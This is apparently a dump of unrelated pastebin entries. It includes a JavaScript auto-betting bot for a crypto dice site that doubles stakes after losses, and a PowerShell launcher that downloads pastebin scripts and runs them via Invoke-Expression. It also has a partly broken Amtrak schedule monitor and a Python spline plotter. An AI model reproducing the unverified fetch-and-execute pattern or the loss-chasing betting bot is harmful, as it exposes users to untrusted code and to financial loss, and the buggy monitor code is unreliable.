var skibi = (BaseBet*12);
var sevens = (BaseBet*6.9);
var eights = (BaseBet*7.9);
var winnerdinner = 128000;
var loL = ((Math.floor(OriginalBalanCe/tens))*tens);
var snowzy = ((Math.floor(OriginalBalanCe/tens))*tens);
var snowy = ((Math.floor(OriginalBalanCe/tens))*tens);
var snow = ((Math.floor(OriginalBalanCe/tens))*tens);
var NewBalanCe = OriginalBalanCe;
var BalanCe = OriginalBalanCe;
 
function go(){
BalanCe = document.getElementById('pct_balance').value;
var dog = Number((BalanCe-OriginalBalanCe).toFixed(8));
console.log(""profit"");
console.log(dog);
if ((BalanCe>(((Math.floor(BalanCe/tens))*tens)+sevens))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+eights))&&(BalanCe!=snowy)){
    NexTBet = NexTBet*2;
    snowy = parseFloat(BalanCe);
}
if ((BalanCe<=(snowzy-skibi))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+fives))){
    NexTBet = BaseBet;
    snowy = ((Math.floor(BalanCe/tens))*tens);
    snowzy = ((Math.floor(BalanCe/tens))*tens);
}
if ((BalanCe>=(snowzy+(tens*3)))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+fives))){
    NexTBet = BaseBet;
    snowy = ((Math.floor(BalanCe/tens))*tens);
    snowzy = ((Math.floor(BalanCe/tens))*tens);
}
if ((BalanCe>=(loL+tens))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+sevens))){
    NexTBet = BaseBet;
    snowy = ((Math.floor(BalanCe/tens))*tens);
    snowzy = ((Math.floor(BalanCe/tens))*tens);
    loL = ((Math.floor(BalanCe/tens))*tens);
}
if (BalanCe>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((NexTBet*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1112);
}
go();"
f9P7QmCT,AMTKStart,ZTTrak,PowerShell,Thursday 23rd of May 2024 10:38:41 PM CDT,"Write-Output ""
 ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà   ‚ñà‚ñà     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà       ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà 
   ‚ñà‚ñà‚ñà     ‚ñà‚ñà       ‚ñà‚ñà    ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà      ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà    ‚ñà‚ñà    
  ‚ñà‚ñà‚ñà      ‚ñà‚ñà       ‚ñà‚ñà    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà       ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà      ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà  ‚ñà‚ñà    ‚ñà‚ñà    
 ‚ñà‚ñà‚ñà       ‚ñà‚ñà       ‚ñà‚ñà    ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà       ‚ñà‚ñà  ‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà      ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà  ‚ñà‚ñà  ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà  ‚ñà‚ñà ‚ñà‚ñà    ‚ñà‚ñà    
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà    ‚ñà‚ñà       ‚ñà‚ñà    ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà      ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà    ‚ñà‚ñà    
                                                                                                                                                      
                                                                                                                                                      ""
Write-Host ""Choose a verison of AmtrakWatcher:""
Write-Host ""1. Stable Release""
Write-Host ""2. Beta Release""
$choice = Read-Host ""Choice""
switch ($choice) {
    ""1"" {
        Write-Output ""Loading latest stable release...""
		$scriptContent = Invoke-WebRequest -Uri ""https://pastebin.com/raw/eDMxQLve"" -UseBasicParsing | Select-Object -ExpandProperty Content
		Invoke-Expression -Command $scriptContent
		Clear-Host
    }
    ""2"" {
        Write-Output ""Loading latest beta release...""
		$scriptContent = Invoke-WebRequest -Uri ""https://pastebin.com/raw/FDYT7T7d"" -UseBasicParsing | Select-Object -ExpandProperty Content
		Invoke-Expression -Command $scriptContent
		Clear-Host
    }
    Default {
        Write-Host ""Invalid choice. Please enter another choice""
    }
	""nuh uh"" {
		Write-Output ""yuh uh""
	}
}
"
FDYT7T7d,AMTKBeta,ZTTrak,PowerShell,Thursday 23rd of May 2024 10:35:38 PM CDT,"Clear-Host
Write-Output ""
 ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà   ‚ñà‚ñà     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà       ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà 
   ‚ñà‚ñà‚ñà     ‚ñà‚ñà       ‚ñà‚ñà    ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà      ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà    ‚ñà‚ñà    
  ‚ñà‚ñà‚ñà      ‚ñà‚ñà       ‚ñà‚ñà    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà       ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà      ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà  ‚ñà‚ñà    ‚ñà‚ñà    
 ‚ñà‚ñà‚ñà       ‚ñà‚ñà       ‚ñà‚ñà    ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà       ‚ñà‚ñà  ‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà      ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà  ‚ñà‚ñà  ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà  ‚ñà‚ñà ‚ñà‚ñà    ‚ñà‚ñà    
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà    ‚ñà‚ñà       ‚ñà‚ñà    ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà      ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà    ‚ñà‚ñà    
                                                                                                                                                      
                                                                                                                                                      ""

Write-Output ""Please note that Amtrak Station NAMES are NOT supported, if you do not know what Amtrak Station Codes are, I recommend searching up the station code.""                                                                                                                                                                
$stationCode = Read-Host ""Enter the Amtrak Station Code you would like to monitor.""
Write-Output ""Your station status will load shortly, if your data loads but an error pops up, please ignore it unless your data for that station does not show up""


$url = ""https://dixielandsoftware.net/Amtrak/solari/data/"" + $stationCode + ""_schedule.txt""
$url2 = ""_schedule.txt""
$currentDate = Get-Date
$year = $currentDate.Year
$month = $currentDate.Month.toString(""D2"")
$day = $currentDate.Day	
$startWriting = 0
$downloadsPath = ""$HOME\Downloads""
$fileName = ""ZTK_DEVELOPMENT_$($year)_$($month)_$($day)_$($stationCode)_STATION.txt""
$filePath = Join-Path -Path $downloadsPath -ChildPath $fileName

$urlfinal = $url + """" + $url2


try {
    $response = Invoke-WebRequest -Uri $url -UseBasicParsing

    if ($response.StatusCode -eq 200) {
        Write-Output $response.Content
        $jsonObject = $response.Content | ConvertFrom-Json

        $currentDate = Get-Date


        $year = $currentDate.Year
        $month = $currentDate.Month
        $day = $currentDate.Day
		Write-Output $year
		Write-Output $month.toString(""D2"")
		Write-Output $day		
        $phrase2 = ""</a>""
        Clear-Host
        Write-Output ""
        ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà   ‚ñà‚ñà     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà       ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà 
           ‚ñà‚ñà‚ñà     ‚ñà‚ñà       ‚ñà‚ñà    ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà      ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà    ‚ñà‚ñà    
          ‚ñà‚ñà‚ñà      ‚ñà‚ñà       ‚ñà‚ñà    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà       ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà      ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà  ‚ñà‚ñà    ‚ñà‚ñà    
         ‚ñà‚ñà‚ñà       ‚ñà‚ñà       ‚ñà‚ñà    ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà       ‚ñà‚ñà  ‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà      ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà  ‚ñà‚ñà  ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà  ‚ñà‚ñà ‚ñà‚ñà    ‚ñà‚ñà    
        ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà    ‚ñà‚ñà       ‚ñà‚ñà    ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà      ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà    ‚ñà‚ñà    
                                                                                                                                                      
                                                                                                                                                      ""
        
        foreach ($item in $jsonObject) {
			Write-Output ""--=New Section=--""
			$trainnonew = $item.trainno
			$outputString = $trainnonew -replace [regex]::Escape($aphrase)
			Write-Output $newTrainNumber
            Write-Output ""Train Number: $($outputString)""
            Write-Output ""Scheduled: $($item.scheduled)""
            Write-Output ""Scheduled 24h: $($item.scheduled24)""
            Write-Output ""Service: $($item.service)""
            Write-Output ""Destination: $($item.destination)""
            Write-Output ""Origin: $($item.origin)""
            Write-Output ""Remarks/Boarding: $($item.remarks_boarding)""
            Write-Output ""New Time: $($item.newtime)""
            Write-Output ""New Time 24h: $($item.newtime24)""
            Write-Output """" 
        }   
		while ($true) {& $refreshDataStart-Sleep -Seconds 30}
    } else {
        Write-Output ""Failed to fetch data for station code $stationCode. Please check the station code and try again.""
    }
} catch {
    Write-Output ""Failed to fetch data for station code $stationCode. Please check the station code and try again. URL was $url""
}


$refreshData = {
    $url = ""https://dixielandsoftware.net/Amtrak/solari/data/"" + $stationCode + ""_schedule.txt""
$url2 = ""_schedule.txt""

$urlfinal = $url + """" + $url2


try {
    $response = Invoke-WebRequest -Uri $url -UseBasicParsing

    if ($response.StatusCode -eq 200) {
        Write-Output $response.Content
        $jsonObject = $response.Content | ConvertFrom-Json
        $phrase2 = ""</a>""
		Write-Output ""Station data has loaded!""
		Clear-Host
        Write-Output ""
        ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà   ‚ñà‚ñà     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà       ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà 
           ‚ñà‚ñà‚ñà     ‚ñà‚ñà       ‚ñà‚ñà    ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà      ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà    ‚ñà‚ñà    
          ‚ñà‚ñà‚ñà      ‚ñà‚ñà       ‚ñà‚ñà    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà       ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà      ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà  ‚ñà‚ñà    ‚ñà‚ñà    
         ‚ñà‚ñà‚ñà       ‚ñà‚ñà       ‚ñà‚ñà    ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà       ‚ñà‚ñà  ‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà      ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà  ‚ñà‚ñà  ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà  ‚ñà‚ñà ‚ñà‚ñà    ‚ñà‚ñà    
        ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà    ‚ñà‚ñà       ‚ñà‚ñà    ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà      ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà    ‚ñà‚ñà    
                                                                                                                                                      
                                                                                                                                                      ""
        foreach ($item in $jsonObject) {
			$trainnonew = $item.trainno
			$outputString = $trainnonew -replace [regex]::Escape($aphrase)
			if (startWriting==1) {
				$fileContent = $fileContent + ""$($item.scheduled)       $($item.scheduled24)       $($item.service)           $($outputString)         $($item.origin)         $($item.destination)        $($item.remarks_boarding)""
				Set-Content -Path $filePath -Value $fileContent
			}
			Write-Output ""--=New Section=--""
            Write-Output ""Train Number: $($outputString)""
            Write-Output ""Scheduled: $($item.scheduled)""
            Write-Output ""Scheduled 24h: $($item.scheduled24)""
            Write-Output ""Service: $($item.service)""
            Write-Output ""Destination: $($item.destination)""
            Write-Output ""Origin: $($item.origin)""
            Write-Output ""Remarks/Boarding: $($item.remarks_boarding)""
            Write-Output ""New Time: $($item.newtime)""
            Write-Output ""New Time 24h: $($item.newtime24)""
            Write-Output """" 
}         
	            
            
    } else {
        Write-Output ""Failed to fetch data for station code $stationCode. Please check the station code and try again.""
    }
} catch {
    Write-Output ""Failed to fetch data for station code $stationCode. Please check the station code and try again. URL was $url""
}
    Get-Date
}
Write-Output ""Station Status will update every 30 seconds""
Write-Host ""Press F1 to write station data to a .txt file""
Write-Host ""Press any key to exit..."" -NoNewline
$x = $host.UI.RawUI.ReadKey(""NoEcho,IncludeKeyDown"")
Add-Type -AssemblyName System.Windows.Forms
$fileContent = ""12h Time------24h Time-----------Train------------Number----------Origin---------Destination-------Status-----""
function Write-TextFile {
    Set-Content -Path $filePath -Value $fileContent
    [System.Windows.Forms.MessageBox]::Show(""File created at: $filePath"", ""File Creation"")
	Write-Output ""The .txt file has been put in Downloads and will resume printing data on the text document until this page closes""
	$startWriting = 1
}
$form = New-Object System.Windows.Forms.Form
$form.Text = ""Press F1 to create a text file""
$form.KeyPreview = $true
$form.Add_KeyDown({
    if ($_.KeyCode -eq [System.Windows.Forms.Keys]::F1) {
        Write-TextFile
    }
})
$form.ShowDialog()

"
mvFK7wig,amazing snowybot,coinwalk,JavaScript,Thursday 23rd of May 2024 10:10:57 PM CDT,"var OriginalBalanCe = parseFloat(document.getElementById('pct_balance').value);
var BaseBet = Number((OriginalBalanCe/240).toFixed(8));
var NexTBet = BaseBet;
var tens = (BaseBet*10);
var fives = (BaseBet*4.9);
var skibi = (BaseBet*12);
var sevens = (BaseBet*6.9);
var eights = (BaseBet*7.9);
var winnerdinner = 128000;
var loL = ((Math.floor(OriginalBalanCe/tens))*tens);
var snowzy = ((Math.floor(OriginalBalanCe/tens))*tens);
var snowy = ((Math.floor(OriginalBalanCe/tens))*tens);
var snow = ((Math.floor(OriginalBalanCe/tens))*tens);
var NewBalanCe = OriginalBalanCe;
var BalanCe = OriginalBalanCe;
var fart = 1;
var joe = false;
var jim = false;
 
function go(){
BalanCe = document.getElementById('pct_balance').value;
var dog = Number((BalanCe-OriginalBalanCe).toFixed(8));
console.log(""profit"");
console.log(dog);
if ((BalanCe>(((Math.floor(BalanCe/tens))*tens)+sevens))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+eights))&&(BalanCe!=snowy)){
    NexTBet = NexTBet*2;
    snowy = parseFloat(BalanCe);
}
if ((BalanCe<=(snowzy-skibi))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+fives))){
    NexTBet = BaseBet;
    fart = 0;
    joe = false;
    jim = false;
    snowy = ((Math.floor(BalanCe/tens))*tens);
    snowzy = ((Math.floor(BalanCe/tens))*tens);
}
if ((BalanCe>=(snowzy-(tens*3)))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+fives))){
    NexTBet = BaseBet;
    fart = 0;
    joe = false;
    jim = false;
    snowy = ((Math.floor(BalanCe/tens))*tens);
    snowzy = ((Math.floor(BalanCe/tens))*tens);
}
if ((BalanCe>=(loL+(tens*fart)))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+sevens))){
    NexTBet = BaseBet;
    fart = 1;
    joe = false;
    jim = false;
    snowy = ((Math.floor(BalanCe/tens))*tens);
    snowzy = ((Math.floor(BalanCe/tens))*tens);
    loL = ((Math.floor(BalanCe/tens))*tens);
}
if (BalanCe>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((NexTBet*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 350);
}
go();"
2DTgS0pj,array_plot_smooth_spline,Python253,Python,Thursday 23rd of May 2024 09:43:13 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: array_plot_smooth_spline.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
Description:
    This script generates a plot of an array of values with a smooth spline passing through the array points.
    It also calculates the sum and average of the array, and plots the maximum area rectangular histogram.

Requirements:
    - Python 3.x
    - matplotlib
    - numpy
    - scipy

Functions:
    - max_area_histogram(heights): Calculates the maximum area of a rectangular histogram given an array of heights.

Usage:
    - Run the script and input the number of elements in the array and the array values.
    - The script will plot the array values with a smooth spline passing through them.
    - It will also display the sum and average of the array, and calculate the maximum area rectangular histogram.

Example Output:

    Enter the number of elements in the array: 6
    Enter the array elements one by one. Hit Enter after each value:
    2
    5
    3
    2
    5
    3
    Array: [2, 5, 3, 2, 5, 3]
    Sum of the array: 20
    Average of the array: 3.3333333333333335
    Maximum area rectangular histogram: 12

Additional Notes:
    - The smooth spline is generated using interpolation techniques.
    - The area under the smooth spline is filled with a transparent color for visualization.
""""""

# Get Essential Imports
import matplotlib.pyplot as plt
import numpy as np
from scipy.interpolate import make_interp_spline

def max_area_histogram(heights):
    """"""
    Calculate the maximum area of a rectangular histogram given an array of heights.

    This function implements the histogram algorithm to calculate the maximum area
    that can be obtained from a rectangular histogram formed by the given heights.

    Parameters:
    heights (list): A list of integers representing the heights of the histogram bars.

    Returns:
    int: The maximum area of the rectangular histogram.
    """"""
    stack: list = []
    max_area = 0
    index = 0
    while index < len(heights):
        if not stack or heights[index] >= heights[stack[-1]]:
            stack.append(index)
            index += 1
        else:
            top_of_stack = stack.pop()
            area = (heights[top_of_stack] * ((index - stack[-1] - 1) if stack else index))
            max_area = max(max_area, area)
    while stack:
        top_of_stack = stack.pop()
        area = (heights[top_of_stack] * ((index - stack[-1] - 1) if stack else index))
        max_area = max(max_area, area)
    return max_area

# Input
while True:
    try:
        n = int(input(""Enter the number of elements in the array: ""))
        if n <= 0:
            print(""Please enter a positive integer for the number of elements."")
            continue
        print(""Enter the array elements one by one. Hit Enter after each value:"")
        array_heights = []
        for i in range(n):
            height = int(input())
            array_heights.append(height)

        # Output the array
        print(""Array:"", array_heights)

        # Calculate and output the sum of the array
        array_sum = sum(array_heights)
        print(""Sum of the array:"", array_sum)

        # Calculate the average of the array
        array_average = array_sum / n
        print(""Average of the array:"", array_average)

        # Generate a smooth spline passing through the array points
        x = np.arange(n)
        y = array_heights
        spline = make_interp_spline(x, y)
        x_smooth = np.linspace(0, n-1, 1000)
        y_smooth = spline(x_smooth)

        # Plot the array and spline
        plt.figure(figsize=(10, 6))
        plt.plot(x_smooth, y_smooth, color='red', linewidth=2, label='Smooth Spline')
        plt.fill_between(x_smooth, y_smooth, color='pink', alpha=0.75)  # Fill under the spline with color
        plt.scatter(x, y, color='blue', marker='o', label='Array Points')
        for i, txt in enumerate(array_heights):
            plt.annotate(str(txt), (x[i], y[i]), textcoords=""offset points"", xytext=(0,10), ha='center')
        plt.xlabel('Index')
        plt.ylabel('Value')
        plt.title('Array Plot with Smooth Spline')
        plt.legend()
        plt.grid(True)
        plt.show()

        # Calculate and output the maximum area rectangular histogram
